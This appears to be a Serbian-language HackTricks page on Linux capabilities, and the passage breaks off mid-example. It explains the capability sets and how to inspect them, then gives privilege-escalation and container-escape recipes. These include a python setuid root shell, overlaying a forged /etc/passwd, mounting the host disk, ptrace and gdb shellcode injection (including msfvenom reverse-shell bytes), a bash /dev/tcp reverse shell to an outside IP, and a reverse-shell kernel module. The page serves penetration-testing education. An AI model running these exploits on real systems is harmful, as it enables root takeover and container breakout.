# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities dele **root privilegije na manje, zasebne jedinice**, omogućavajući procesima da imaju podskup privilegija. Ovo smanjuje rizike tako što se ne dodeljuju pune root privilegije kada to nije neophodno.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Problem:

- Normalni korisnici imaju ograničene dozvole za operacije kao što su otvaranje raw sockets ili povezivanje Internet portova ispod 1024; capabilities mogu dodeliti samo potrebnu operaciju umesto pune root privilegije.<sup>[[14]](#references)</sup>

### Skupovi capabilities:

Linux izlaže ove skupove capabilities po thread-u, a kernel primenjuje njihova ograničenja kada proces menja credentials ili izvršava fajl.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Svrha**: Identifikuje capabilities koje mogu doprineti permitted skupu nakon `execve()` kada izvršeni fajl ima odgovarajuće inheritable file capabilities.
- **Funkcionalnost**: Inheritable skup thread-a se čuva tokom `execve()`; sam po sebi ne čini te capabilities effective.
- **Ograničenja**: Dodavanje capability u ovaj skup ograničeno je permitted i bounding skupovima.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Svrha**: Predstavlja stvarne capabilities koje proces koristi u datom trenutku.
- **Funkcionalnost**: To je skup capabilities koji kernel proverava da bi odobrio dozvolu za različite operacije. Kod fajlova, ovaj skup može biti zastavica koja pokazuje da li permitted capabilities fajla treba smatrati effective.
- **Značaj**: Effective skup je ključan za trenutne provere privilegija i predstavlja aktivni skup capabilities koje proces može da koristi.

3. **Permitted (CapPrm)**:

- **Svrha**: Definiše maksimalni skup capabilities koje proces može da poseduje.
- **Funkcionalnost**: Proces može da podigne capability iz permitted skupa u effective skup, čime dobija mogućnost da je koristi. Takođe može da ukloni capabilities iz permitted skupa.
- **Granica**: Ako se capability ukloni iz ovog skupa, obično se ne može vratiti bez izvršavanja fajla koji je dodeljuje ili druge privileged tranzicije.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Svrha**: Ograničava capabilities koje proces može da dobije iz fajla tokom `execve()` i koje može da doda u svoj inheritable skup.
- **Funkcionalnost**: Skup se nasleđuje tokom `fork()` i čuva tokom `execve()`; capabilities se mogu ukloniti iz njega kada caller ima `CAP_SETPCAP`.
- **Primena**: Uklanjanje nepotrebnih capabilities iz ovog skupa ograničava kasnije sticanje privilegija.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Svrha**: Omogućava da odabrane capabilities ostanu permitted i effective tokom `execve()` neprivilegovanog programa.
- **Funkcionalnost**: Ambient capabilities se dodaju u nove permitted i effective skupove kada izvršeni fajl nije privileged.
- **Ograničenja**: Capability može biti ambient samo dok je prisutna i u permitted i u inheritable skupovima; izvršavanje set-user-ID/set-group-ID fajla ili fajla sa capabilities briše ambient skup.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities procesa i binarnih datoteka

### Capabilities procesa

Da biste videli capabilities određenog procesa, koristite fajl **status** u /proc direktorijumu. Pošto pruža više detalja, ograničimo prikaz samo na informacije povezane sa Linux capabilities.\
Imajte na umu da se za sve pokrenute procese informacije o capabilities održavaju po thread-u, dok se file capabilities čuvaju u proširenim atributima `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Capabilities definisane su u /usr/include/linux/capability.h

Capabilities trenutnog procesa možete pronaći pomoću `cat /proc/self/status` ili komande `capsh --print`, a capabilities drugih procesa u `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ova komanda bi trebalo da vrati pet linija sa capability vrednostima na većini sistema.<sup>[[15]](#references)</sup>

- CapInh = Nasleđene capability vrednosti
- CapPrm = Dozvoljene capability vrednosti
- CapEff = Efektivne capability vrednosti
- CapBnd = Bounding set
- CapAmb = Skup ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ovi heksadecimalni brojevi nemaju smisla. Pomoću uslužnog programa `capsh` možemo ih dekodirati u nazive capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Proverimo sada **capabilities** koje koristi `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Iako to funkcioniše, postoji još jedan i jednostavniji način. Da biste videli capabilities pokrenutog procesa, koristite alat **getpcaps** iza kojeg sledi ID procesa (PID); alat takođe prihvata listu ID-ova procesa.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Proverimo mogućnosti programa `tcpdump` nakon dodeljivanja capability-ja `cap_net_admin` i `cap_net_raw` binarnoj datoteci za sniffing mreže (`tcpdump` se izvršava u procesu 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kao što možete videti, capabilities odgovaraju rezultatima dva načina ispitivanja procesa. Alat `getpcaps` koristi libcap za proveru capabilities ciljnog procesa i ispisuje ih u tekstualnom obliku; prihvata jedan ili više PID-ova.<sup>[[22]](#references)</sup>

### Capabilities binarnih datoteka

Binarne datoteke mogu imati file capabilities koje se primenjuju tokom izvršavanja. Na primer, binarna datoteka `ping` može sadržati capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Možete **pretraživati binarne datoteke sa capabilities** pomoću `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Uklanjanje capabilities pomoću capsh

Ako uklonimo `CAP_NET_RAW` iz trenutno važećeg bounding seta, program kojem je ta capability potrebna više ne bi trebalo da može da je koristi.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Pored izlaza same komande _capsh_, i sama komanda _tcpdump_ bi trebalo da prikaže grešku.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Greška pokazuje da `tcpdump` ne može da se izvrši sa zahtevanym file capability-jem nakon što je `CAP_NET_RAW` uklonjen iz bounding seta.

### Uklanjanje capabilities

Capabilities fajla možete ukloniti pomoću `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Capabilities korisnika

Linux ne dodeljuje capabilities datotekama direktno korisniku za prijavljivanje, ali PAM modul `pam_cap` može da postavi inheritable capabilities za autentifikovane sesije koristeći `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Svaki unos mapira capability imena ili brojeve, razdvojene zarezima, na jedno ili više korisničkih imena.<sup>[[17]](#references)</sup>
Primer datoteke:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

Kompiliranjem sledećeg programa moguće je **spawn-ovati bash shell unutar environment-a koji pruža capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Unutar **bash-a koji izvršava kompajlirani ambient binary**, moguće je uočiti **new capabilities** (običan korisnik neće imati nijednu capability u odeljku „current“).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Možete dodati **samo capabilities koje su prisutne** i u dozvoljenom i u nasledivom skupu.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binarni fajlovi

Capability-dumb binarni fajl je program sa file capabilities koji ne koristi libcap za njihovo upravljanje. Ako je njegov file effective bit postavljen, kernel omogućava file permitted capabilities u effective skupu procesa; izvršavanje može biti neuspešno ako proces nije dobio sve permitted capabilities.<sup>[[14]](#references)</sup>

## Service Capabilities

Sistemski servis koji se izvršava kao root može zadržati širok skup capabilities, osim ako ih njegovo execution okruženje ne ograničava. U systemd unit-u, `User=` bira korisnika servisa, a `AmbientCapabilities=` dodaje imenovane capabilities u ambient skup izvršenog procesa.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities u Docker kontejnerima

Docker pokreće kontejnere sa podrazumevanim skupom capabilities koji se može promeniti pomoću `--cap-add` i `--cap-drop`; primer kontejnera može se proveriti pomoću `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities su korisne kada **želite da ograničite sopstvene procese nakon izvršavanja privilegovanih operacija** (npr. nakon podešavanja chroot-a i povezivanja sa socketom). Međutim, mogu se iskoristiti prosleđivanjem zlonamernih komandi ili argumenata koji se zatim izvršavaju kao root.<sup>[[2]](#references)</sup>

Možete nametnuti file capabilities programima pomoću `setcap`, a proveriti ih pomoću `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
U tekstu file-capability, `+ep` podiže imenovanu capability u efektivnom i dozvoljenom skupu; `-` snižava izabrane zastavice.<sup>[[21]](#references)</sup>

Da biste identifikovali programe u sistemu ili fascikli koji imaju capability, koristite `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Primer eksploatacije

U sledećem primeru utvrđeno je da je binary `/usr/bin/python2.6` ranjiv na privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** potrebne da `tcpdump` **omogući svakom korisniku sniffovanje paketa**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Poseban slučaj „praznih“ capabilities

Datoteka može sadržati prazan skup capabilities (`getcap myelf` vraća `myelf =ep`). Prazan skup ne daje nikakve capabilities; kada se kombinuje sa set-user-ID bitom u vlasništvu root-a, program i dalje može da promeni efektivne i sačuvane ID-jeve izvršavajućeg procesa na 0, bez dobijanja file capabilities. Datoteka bez vlasnika, koja nije SUID/SGID i ima `=ep`, ne pokreće se kao root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je veoma moćna Linux capability, često izjednačavana sa nivoom gotovo jednakim root-u zbog svojih širokih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulisanje funkcijama kernela. Iako je neophodna za kontejnere koji simuliraju čitave sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, naročito u kontejnerizovanim okruženjima, zbog potencijala za eskalaciju privilegija i kompromitovanje sistema. Zbog toga njena upotreba zahteva stroge bezbednosne procene i pažljivo upravljanje, uz snažnu preporuku da se ova capability ukloni iz kontejnera namenjenih konkretnim aplikacijama, kako bi se primenio **princip najmanjih privilegija** i smanjila površina napada.<sup>[[14]](#references)</sup>

**Primer sa binary fajlom**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pomoću Pythona možete montirati izmenjeni _passwd_ fajl preko stvarnog _passwd_ fajla:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I na kraju izvršite **mount** izmenjenog fajla `passwd` na `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I moći ćete da se prijavite pomoću **`su` kao root** koristeći lozinku „password“.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene capabilities unutar docker kontejnera pomoću:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
U prethodnom izlazu možete videti da je capability SYS_ADMIN omogućena.<sup>[[14]](#references)</sup>

- **Mount**

Uz odgovarajući pristup uređaju i namespace-u, ovo može omogućiti Docker containeru da **mountuje disk hosta i pristupi njegovom sadržaju**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Potpuni pristup**

U prethodnoj metodi uspeli smo da pristupimo disku hosta.\
Ako host pokreće **ssh** server, mogli biste da **kreirate korisnika unutar montiranog diska** i pristupite mu putem SSH-a.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Sa `CAP_SYS_PTRACE`, proces može da prati i pregleda druge procese koji su vidljivi u njegovom PID namespace-u. Da biste ciljali procese hosta iz Docker containera, delite host PID namespace pomoću `--pid=host` (ili se pridružite namespace-u koji sadrži cilj).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava korišćenje funkcionalnosti za debugging i praćenje sistemskih poziva koje pruža `ptrace(2)`, kao i poziva za pristup memoriji drugih procesa, poput `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan za potrebe dijagnostike i nadzora, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera, kao što je seccomp filter na `ptrace(2)`, može značajno da naruši bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, naročito onih koje nameće seccomp, kao što je prikazano u [proofs of concept (PoC) poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Primer sa binarnim fajlom (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Primer sa binarnom datotekom (gdb)**

`gdb` sa `ptrace` capability:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Kreirajte shellcode pomoću msfvenom za ubacivanje u memoriju putem gdb-a
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Otklonite greške u root procesu pomoću gdb-a i kopirajte i nalepite prethodno generisane gdb linije:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Primer sa okruženjem (Docker breakout) - Druga zloupotreba gdb-a**

Ako je **GDB** instaliran (ili ga možete instalirati pomoću `apk add gdb` ili, na primer, `apt install gdb`), možete **debug-ovati proces sa hosta** i naterati ga da pozove funkciju `system`. (Ova tehnika takođe zahteva capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nećete moći da vidite izlaz izvršene komande, ali će je taj proces izvršiti (zato dobijte rev shell).

> [!WARNING]
> Ako dobijete grešku "No symbol "system" in current context.", pogledajte prethodni primer učitavanja shellcode-a u program putem gdb-a.

**Primer sa environment-om (Docker breakout) - Shellcode Injection**

Možete proveriti omogućene capabilities unutar docker containera koristeći:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Izlistaj **procese** koji se izvršavaju na **hostu** `ps -eaf`

1. Nabavi **arhitekturu** `uname -m`
2. Pronađi **shellcode** za arhitekturu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Pronađi **program** za **inject** **shellcode-a** u memoriju procesa ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Izmeni** **shellcode** unutar programa i kompajliraj ga `gcc inject.c -o inject`
5. **Injectuj** ga i preuzmi svoj **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** omogućava procesu da **učitava i uklanja module jezgra (`init_module(2)`, `finit_module(2)` i `delete_module(2)` sistemski pozivi)**, pružajući direktan pristup osnovnim operacijama jezgra. Ova mogućnost predstavlja kritične bezbednosne rizike zato što učitavanje modula može izmeniti ponašanje jezgra i potencijalno zaobići granice izolacije.<sup>[[6]](#references)[[14]](#references)</sup>
**Ovo omogućava ubacivanje ili uklanjanje modula u jezgru vidljivom procesu; u containeru, da li je to jezgro hosta zavisi od konfiguracije izolacije**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

U sledećem primeru, binarna datoteka **`python`** ima ovu mogućnost.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Po podrazumevanim podešavanjima, komanda **`modprobe`** proverava liste zavisnosti i map datoteke u direktorijumu **`/lib/modules/$(uname -r)`**.\
Da bismo ovo zloupotrebili, napravićemo lažni direktorijum **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Zatim **kompajlirajte kernel module koji možete pronaći u 2 primera u nastavku i kopirajte** ga u ovu fasciklu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Konačno, izvršite potreban Python kod da učitate ovaj kernel modul:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Primer 2 sa binaryjem**

U sledećem primeru binary **`kmod`** ima ovu capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Što znači da je moguće koristiti komandu **`insmod`** za ubacivanje kernel modula. Pratite primer u nastavku da biste dobili **reverse shell** zloupotrebom ove privilegije.

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene capabilities unutar docker containera pomoću:
```bash
capsh --print
